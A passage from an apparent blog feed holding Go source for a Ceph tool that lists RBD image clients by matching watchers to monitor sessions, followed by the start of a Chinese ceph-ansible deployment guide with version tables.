<span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;size&quot;`</span><br>Objects         <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;objects&quot;`</span><br>SnapshotCount   <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;snapshot_count&quot;`</span><br>BlockNamePrefix <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;block_name_prefix&quot;`</span><br>Format          <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;format&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephMONSessionAddrItem <span class="hljs-keyword">struct</span> &#123;<br>Type  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;type&quot;`</span><br>Addr  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;addr&quot;`</span><br>Nonce <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;nonce&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephMONSessionAddrs <span class="hljs-keyword">struct</span> &#123;<br>AddrVec []CephMONSessionAddrItem <span class="hljs-string">`json:&quot;addrvec&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephMONSession <span class="hljs-keyword">struct</span> &#123;<br>Name           <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;name&quot;`</span><br>EntityName     <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;entity_name&quot;`</span><br>Addrs          CephMONSessionAddrs    <span class="hljs-string">`json:&quot;addrs&quot;`</span><br>SocketAddr     CephMONSessionAddrItem <span class="hljs-string">`json:&quot;socket_addr&quot;`</span><br>ConType        <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;con_type&quot;`</span><br>Open           <span class="hljs-type">bool</span>                   <span class="hljs-string">`json:&quot;open&quot;`</span><br>Authenticated  <span class="hljs-type">bool</span>                   <span class="hljs-string">`json:&quot;authenticated&quot;`</span><br>GlobalId       <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;global_id&quot;`</span><br>GlobalIdStatus <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;global_id_status&quot;`</span><br>OsdEpoch       <span class="hljs-type">int64</span>                  <span class="hljs-string">`json:&quot;osd_epoch&quot;`</span><br>RemoteHost     <span class="hljs-type">string</span>                 <span class="hljs-string">`json:&quot;remote_host&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephRBDClientMetadata <span class="hljs-keyword">struct</span> &#123;<br>Image CephRBDPoolImage <span class="hljs-string">`json:&quot;image&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> CephRBDClient <span class="hljs-keyword">struct</span> &#123;<br>Pool     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;pool&quot;`</span><br>Image    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;image&quot;`</span><br>Entity   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;entity&quot;`</span><br>IP       <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;ip&quot;`</span><br>Hostname <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;hostname&quot;`</span><br>Type     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;type&quot;`</span> <span class="hljs-comment">// kernel/fuse</span><br>Gid      <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;gid&quot;`</span><br>Metadata <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;medata&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ImageTask <span class="hljs-keyword">struct</span> &#123;<br>pool *CephPool<br>img  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> progressCounter <span class="hljs-keyword">struct</span> &#123;<br>total     <span class="hljs-type">int64</span><br>completed <span class="hljs-type">int64</span><br>poolName  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runCmd</span><span class="hljs-params">(cmd <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>cmdobj := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd)<br>ret, err := cmdobj.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, fmt.Errorf(<span class="hljs-string">&quot;run cmd error, cmd: %s, err: %s&quot;</span>, cmd, ret)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(ret), <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getMONState</span><span class="hljs-params">(conf <span class="hljs-type">string</span>)</span></span> (cret *CephMonState, cerr <span class="hljs-type">error</span>) &#123;<br>cmd := fmt.Sprintf(<span class="hljs-string">&quot;ceph --conf %s --user admin -f json mon stat&quot;</span>, conf)<br>ret, err := runCmd(cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;get ceph mon state error, cmd: %s&quot;</span>, cmd)<br>&#125;<br><span class="hljs-keyword">var</span> state CephMonState<br><span class="hljs-keyword">if</span> err := json.Unmarshal([]<span class="hljs-type">byte</span>(ret), &amp;state); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;parse ceph mon state error, cmd: %s, ret: %s&quot;</span>, cmd, ret)<br>&#125;<br><br><span class="hljs-keyword">return</span> &amp;state, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getMONSessions</span><span class="hljs-params">(conf <span class="hljs-type">string</span>)</span></span> (cret <span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*CephMONSession, cerr <span class="hljs-type">error</span>) &#123;<br>monstat, err := getMONState(conf)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;get ceph mon state error&quot;</span>)<br>&#125;<br><br>sessions := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*CephMONSession)<br><span class="hljs-keyword">for</span> _, quorum := <span class="hljs-keyword">range</span> monstat.Quorum &#123;<br>cmd := fmt.Sprintf(<span class="hljs-string">&quot;ceph --conf %s --user admin -f json tell mon.%s sessions&quot;</span>, conf, quorum.Name)<br>ret, err := runCmd(cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;get ceph mon sessions error, cmd: %s&quot;</span>, cmd)<br>&#125;<br><span class="hljs-keyword">var</span> monsessions []*CephMONSession<br><span class="hljs-keyword">if</span> err := json.Unmarshal([]<span class="hljs-type">byte</span>(ret), &amp;monsessions); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;parse ceph mon sessions error, cmd: %s, ret: %s&quot;</span>, cmd, ret)<br>&#125;<br><br><span class="hljs-keyword">for</span> _, session := <span class="hljs-keyword">range</span> monsessions &#123;<br><span class="hljs-keyword">if</span> _, exists := sessions[session.GlobalId]; !exists &#123;<br>sessions[session.GlobalId] = session<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> sessions, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getPools</span><span class="hljs-params">(conf <span class="hljs-type">string</span>)</span></span> (cret []*CephPool, cerr <span class="hljs-type">error</span>) &#123;<br>cmd := fmt.Sprintf(<span class="hljs-string">&quot;ceph --conf %s --user admin -f json osd pool ls detail&quot;</span>, conf)<br>ret, err := runCmd(cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;get ceph osd pool error, cmd: %s&quot;</span>, cmd)<br>&#125;<br><span class="hljs-keyword">var</span> pools []*CephPool<br><span class="hljs-keyword">if</span> err := json.Unmarshal([]<span class="hljs-type">byte</span>(ret), &amp;pools); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;parse ceph osd pool error, cmd: %s, ret: %s&quot;</span>, cmd, ret)<br>&#125;<br><br><span class="hljs-keyword">return</span> pools, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 处理单个RBD image</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processImage</span><span class="hljs-params">(conf <span class="hljs-type">string</span>, task *ImageTask, monsessions <span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*CephMONSession)</span></span> ([]*CephRBDClient, []<span class="hljs-type">error</span>) &#123;<br>pool := task.pool<br>img := task.img<br><br><span class="hljs-comment">// 获取rbd image信息</span><br>imginfocmd := fmt.Sprintf(<span class="hljs-string">&quot;rbd --conf %s --id admin info --format json --pool %s --image %s&quot;</span>,<br>conf, pool.Name, img)<br>imginforet, err := runCmd(imginfocmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, []<span class="hljs-type">error</span>&#123;fmt.Errorf(<span class="hljs-string">&quot;get image info error, pool: %s, img: %s: %v&quot;</span>, pool.Name, img, err)&#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> imginfo CephRBDPoolImage<br><span class="hljs-keyword">if</span> err := json.Unmarshal([]<span class="hljs-type">byte</span>(imginforet), &amp;imginfo); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, []<span class="hljs-type">error</span>&#123;fmt.Errorf(<span class="hljs-string">&quot;parse image info error, pool: %s, img: %s: %v&quot;</span>, pool.Name, img, err)&#125;<br>&#125;<br><br>blocknamepre := strings.Split(imginfo.BlockNamePrefix, <span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blocknamepre) != <span class="hljs-number">2</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, []<span class="hljs-type">error</span>&#123;fmt.Errorf(<span class="hljs-string">&quot;invalid block_name_prefix: %s, pool: %s, img: %s&quot;</span>, imginfo.BlockNamePrefix, pool.Name, img)&#125;<br>&#125;<br><br><span class="hljs-comment">// 获取 watchers</span><br><span class="hljs-keyword">var</span> clients []*CephRBDClient<br><span class="hljs-keyword">var</span> errs []<span class="hljs-type">error</span><br>cmd := fmt.Sprintf(<span class="hljs-string">&quot;rados --conf %s --id admin --format json --pool %s listwatchers rbd_header.%s&quot;</span>, conf, pool.Name, blocknamepre[<span class="hljs-number">1</span>])<br>ret, err := runCmd(cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, []<span class="hljs-type">error</span>&#123;fmt.Errorf(<span class="hljs-string">&quot;get watchers error, pool: %s, img: %s&quot;</span>, pool.Name, img)&#125;<br>&#125;<br><span class="hljs-keyword">for</span> _, imgwatchline := <span class="hljs-keyword">range</span> strings.Split(ret, <span class="hljs-string">&quot;\n&quot;</span>) &#123;<br>lineinfo := strings.Split(imgwatchline, <span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lineinfo) != <span class="hljs-number">3</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// parse rbd image client ip and watcher</span><br>cwatcherraw1 := strings.Split(lineinfo[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;=&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cwatcherraw1) != <span class="hljs-number">2</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>cwatcherraw2 := strings.Split(cwatcherraw1[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cwatcherraw2) != <span class="hljs-number">2</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>ip := cwatcherraw2[<span class="hljs-number">0</span>]<br><span class="hljs-comment">// clientwatcher := lineinfo[0] + &quot; &quot; + lineinfo[1]</span><br><br><span class="hljs-comment">// parse rbd image client id</span><br>gidraw := strings.Split(lineinfo[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(gidraw) != <span class="hljs-number">2</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>gid, _ := strconv.ParseInt(gidraw[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-comment">// fetch mon seesion</span><br>session, exists := monsessions[gid]<br><span class="hljs-keyword">if</span> !exists &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, []<span class="hljs-type">error</span>&#123;fmt.Errorf(<span class="hljs-string">&quot;get rbd client gid error, pool: %s, img: %s: %v&quot;</span>, pool.Name, img, err)&#125;<br>&#125;<br><br><span class="hljs-comment">// record client</span><br>client := &amp;CephRBDClient&#123;<br>IP:       ip,<br>Hostname: session.RemoteHost,<br>Type:     <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">// 类型暂时留空</span><br>Gid:      gid,<br>Entity:   session.EntityName,<br>Pool:     pool.Name,<br>Image:    img,<br>&#125;<br><br>clients = <span class="hljs-built_in">append</span>(clients, client)<br>&#125;<br><br><span class="hljs-keyword">return</span> clients, errs<br>&#125;<br><br><span class="hljs-comment">// 显示进度</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">showProgress</span><span class="hljs-params">(counter *progressCounter)</span></span> &#123;<br>ticker := time.NewTicker(<span class="hljs-number">500</span> * time.Millisecond)<br><span class="hljs-keyword">defer</span> ticker.Stop()<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> ticker.C &#123;<br>completed := atomic.LoadInt64(&amp;counter.completed)<br>total := atomic.LoadInt64(&amp;counter.total)<br><br><span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br>percent := <span class="hljs-type">float64</span>(completed) / <span class="hljs-type">float64</span>(total) * <span class="hljs-number">100</span><br>fmt.Printf(<span class="hljs-string">&quot;\rProcessing pool %s: %d/%d (%.2f%%)&quot;</span>,<br>counter.poolName, completed, total, percent)<br><br><span class="hljs-keyword">if</span> completed &gt;= total &#123;<br>fmt.Printf(<span class="hljs-string">&quot;\rProcessing pool %s: %d/%d (100.00%%)\n&quot;</span>,<br>counter.poolName, total, total)<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 打印客户端信息表格</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printClientTable</span><span class="hljs-params">(clients []*CephRBDClient)</span></span> &#123;<br>symbols := tw.NewSymbolCustom(<span class="hljs-string">&quot;Nature&quot;</span>).WithRow(<span class="hljs-string">&quot;-&quot;</span>).WithColumn(<span class="hljs-string">&quot;|&quot;</span>)<br>table := tablewriter.NewTable(os.Stdout, tablewriter.WithRenderer(renderer.NewBlueprint(tw.Rendition&#123;Symbols: symbols&#125;)))<br>table.Header([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Pool&quot;</span>, <span class="hljs-string">&quot;Image&quot;</span>, <span class="hljs-string">&quot;Entity&quot;</span>, <span class="hljs-string">&quot;Client IP&quot;</span>, <span class="hljs-string">&quot;GID&quot;</span>&#125;)<br><br><span class="hljs-keyword">for</span> _, client := <span class="hljs-keyword">range</span> clients &#123;<br>table.Append([]<span class="hljs-type">string</span>&#123;<br>client.Pool,<br>client.Image,<br>client.Entity,<br>client.IP,<br>strconv.FormatInt(client.Gid, <span class="hljs-number">10</span>),<br>&#125;)<br>&#125;<br><br>table.Render()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(os.Args) &lt; <span class="hljs-number">4</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Usage: go run ./ ceph_config_file ceph_keyring_file concurrency&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;Example: go run ./ ceph.conf ceph.client.admin.keyring 20&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 解析参数</span><br>cephConfig := os.Args[<span class="hljs-number">1</span>]<br>cephKeyring := os.Args[<span class="hljs-number">2</span>]<br>concurrency, err := strconv.Atoi(os.Args[<span class="hljs-number">3</span>])<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || concurrency &lt;= <span class="hljs-number">0</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error: concurrency must be a positive integer&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 检查文件存在性</span><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> []<span class="hljs-type">string</span>&#123;cephConfig, cephKeyring&#125; &#123;<br><span class="hljs-keyword">if</span> _, err := os.Stat(file); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: file not found: %s\n&quot;</span>, file)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: accessing file %s: %v\n&quot;</span>, file, err)<br>&#125;<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 获取 mon sessions</span><br>monsessions, err := getMONSessions(cephConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: get ceph mon sessions: %v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 获取 ceph pools</span><br>pools, err := getPools(cephConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: get ceph osd pools: %v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 全局结果收集</span><br><span class="hljs-keyword">var</span> allClients []*CephRBDClient<br><span class="hljs-keyword">var</span> allErrors []<span class="hljs-type">error</span><br><span class="hljs-keyword">var</span> wgResults sync.WaitGroup<br>wgResults.Add(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">// 错误收集协程</span><br>errors := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1000</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> err := <span class="hljs-keyword">range</span> errors &#123;<br>allErrors = <span class="hljs-built_in">append</span>(allErrors, err)<br>&#125;<br>wgResults.Done()<br>&#125;()<br><br><span class="hljs-comment">// 按顺序处理每个 pool</span><br><span class="hljs-keyword">for</span> _, pool := <span class="hljs-keyword">range</span> pools &#123;<br><span class="hljs-keyword">if</span> _, exists := pool.ApplicationMetadata[<span class="hljs-string">&quot;rbd&quot;</span>]; !exists &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Skipping non-RBD pool: %s\n&quot;</span>, pool.Name)<br><span class="hljs-keyword">continue</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;\nProcessing RBD pool: %s\n&quot;</span>, pool.Name)<br><br><span class="hljs-comment">// 获取当前 pool 的 images</span><br>cmd := fmt.Sprintf(<span class="hljs-string">&quot;rbd --conf %s --id admin list --format json --pool %s&quot;</span>, cephConfig, pool.Name)<br>ret, err := runCmd(cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: get rbd images for pool %s: %v\n&quot;</span>, pool.Name, err)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">var</span> images []<span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> err := json.Unmarshal([]<span class="hljs-type">byte</span>(ret), &amp;images); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Error: parse images for pool %s: %v\n&quot;</span>, pool.Name, err)<br><span class="hljs-keyword">continue</span><br>&#125;<br>totalImages := <span class="hljs-built_in">len</span>(images)<br><span class="hljs-keyword">if</span> totalImages == <span class="hljs-number">0</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;No images found in pool %s\n&quot;</span>, pool.Name)<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// 设置进度计数器</span><br>counter := &amp;progressCounter&#123;<br>total:    <span class="hljs-type">int64</span>(totalImages),<br>poolName: pool.Name,<br>&#125;<br><br><span class="hljs-comment">// 启动进度显示</span><br><span class="hljs-keyword">go</span> showProgress(counter)<br><br><span class="hljs-comment">// 创建任务队列</span><br>taskChan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ImageTask, totalImages)<br>results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []*CephRBDClient, totalImages)<br><br><span class="hljs-comment">// 添加任务</span><br><span class="hljs-keyword">for</span> _, img := <span class="hljs-keyword">range</span> images &#123;<br>taskChan &lt;- &amp;ImageTask&#123;<br>pool: pool,<br>img:  img,<br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(taskChan)<br><br><span class="hljs-comment">// 启动worker</span><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(concurrency)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; concurrency; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskChan &#123;<br>clients, errs := processImage(cephConfig, task, monsessions)<br><br><span class="hljs-comment">// 发送结果</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(clients) &gt; <span class="hljs-number">0</span> &#123;<br>results &lt;- clients<br>&#125;<br><br><span class="hljs-comment">// 发送错误</span><br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> errs &#123;<br>errors &lt;- err<br>&#125;<br><br><span class="hljs-comment">// 更新进度</span><br>atomic.AddInt64(&amp;counter.completed, <span class="hljs-number">1</span>)<br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// 结果收集协程</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> clients := <span class="hljs-keyword">range</span> results &#123;<br>allClients = <span class="hljs-built_in">append</span>(allClients, clients...)<br>&#125;<br>&#125;()<br><br><span class="hljs-comment">// 等待所有worker完成</span><br>wg.Wait()<br><span class="hljs-built_in">close</span>(results)<br>&#125;<br><br><span class="hljs-comment">// 等待错误收集完成</span><br><span class="hljs-built_in">close</span>(errors)<br>wgResults.Wait()<br><br><span class="hljs-comment">// 打印错误信息</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(allErrors) &gt; <span class="hljs-number">0</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;\n\nEncountered %d errors:\n&quot;</span>, <span class="hljs-built_in">len</span>(allErrors))<br><span class="hljs-keyword">for</span> i, err := <span class="hljs-keyword">range</span> allErrors &#123;<br>fmt.Printf(<span class="hljs-string">&quot;  [%d] %s\n&quot;</span>, i+<span class="hljs-number">1</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 打印客户端信息表格</span><br>fmt.Printf(<span class="hljs-string">&quot;\nFound %d RBD client connections:\n&quot;</span>, <span class="hljs-built_in">len</span>(allClients))<br>printClientTable(allClients)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ceph-ansible 集群部署运维指南</title>
      <link href="/2023/04/12/ceph-ansible/"/>
      <url>/2023/04/12/ceph-ansible/</url>
      
        <content type="html"><![CDATA[<p>本文详细介绍了使用 ceph-ansible 部署和运维 Ceph 集群的过程，包括各版本及其依赖的 Ansible 版本的对应关系、自定义模块与任务的结构、集群部署、运维操作及相关示例。特别强调了环境配置、节点连通性验证、MDS 和 OSD 组件的管理，以及安全和性能优化注意事项。</p><h1 id="一、项目介绍"><a href="#一、项目介绍" class="headerlink" title="一、项目介绍"></a>一、项目介绍</h1><p>以下分析基于 ceph-ansible stable-6.0 分支代码。</p><h2 id="1-1、版本与对应关系"><a href="#1-1、版本与对应关系" class="headerlink" title="1.1、版本与对应关系"></a>1.1、版本与对应关系</h2><p>目前 ceph-ansible 采用不同的代码分支来支持部署不同版本的 ceph 集群，且每个代码分支需要特定的 ansible 版本支持，具体的对应关系如下（以下对应关系更新于 2025&#x2F;05&#x2F;23 ）：</p><table><thead><tr><th align="center">ceph-ansible 分支</th><th align="center">支持的 ceph 版本</th><th align="center">依赖的 ansible 核心版本</th><th align="center">依赖的 ansible 发布版本包</th></tr></thead><tbody><tr><td align="center">stable-3.0</td><td align="center">Jewel(V10), Luminous(V12)</td><td align="center">2.4</td><td align="center">-</td></tr><tr><td align="center">stable-3.1</td><td align="center">Luminous(V12), Mimic(V13)</td><td align="center">2.4</td><td align="center">-</td></tr><tr><td align="center">stable-3.2</td><td align="center">Luminous(V12), Mimic(V13)</td><td align="center">2.6</td><td align="center">-</td></tr><tr><td align="center">stable-4.0</td><td align="center">Nautilus(V14)</td><td align="center">2.9</td><td align="center">-</td></tr><tr><td align="center">stable-5.0</td><td align="center">Octopus(V15)</td><td align="center">2.9</td><td align="center">-</td></tr><tr><td align="center">stable-6.0</td><td align="center">Pacific(V16)</td><td align="center">2.10</td><td align="center">2.10&#x2F;3.x</td></tr><tr><td align="center">stable-7.0</td><td align="center">Quincy(V17)</td><td align="center">2.15</td><td align="center">8.x</td></tr><tr><td align="center">stable-8.0</td><td align="center">Reef(V18)</td><td align="center">2.15&#x2F;2.16</td><td align="center">8.x&#x2F;9.x</td></tr><tr><td align="center">stable-9.0</td><td align="center">Squid(V19)</td><td align="center">2.15&#x2F;2.16</td><td align="center">8.x&#x2F;9.x</td></tr><tr><td align="center">main</td><td align="center">devel</td><td align="center">2.15&#x2F;2.16</td><td align="center">8.x&#x2F;9.x</td></tr></tbody></table><p>补充 Ansible 的社区更新日志对应信息，<a href="https://docs.ansible.com/ansible/devel/reference_appendices/release_and_maintenance.html#ansible-community-changelogs">原始地址</a> ：</p><table><thead><tr><th align="center">Ansible 社区软件包</th><th align="center">状态</th><th align="center">依赖的核心版本</th></tr></thead><tbody><tr><td align="center">12.0.0</td><td align="center">开发中（未发布）</td><td align="center">2.19</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/11/CHANGELOG-v11.md">11.x</a></td><td align="center">当前</td><td align="center">2.18</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/10/CHANGELOG-v10.md">10.x</a></td><td align="center">10.7 之后 EOL</td><td align="center">2.17</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/9/CHANGELOG-v9.rst">9.x</a></td><td align="center">9.13 之后 EOL</td><td align="center">2.16</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/8/CHANGELOG-v8.rst">8.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.15</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/7/CHANGELOG-v7.rst">7.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.14</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/6/CHANGELOG-v6.rst">6.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.13</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/5/CHANGELOG-v5.rst">5.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.12</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/4/CHANGELOG-v4.rst">4.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.11</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/3/CHANGELOG-v3.rst">3.x</a></td><td align="center">不再维护（生命周期结束）</td><td align="center">2.10</td></tr><tr><td align="center"><a href="https://github.com/ansible-community/ansible-build-data/blob/main/2.10/CHANGELOG-v2.10.rst">2.10</a></td><td align="center">不再维护（生命周期结束）</td><td 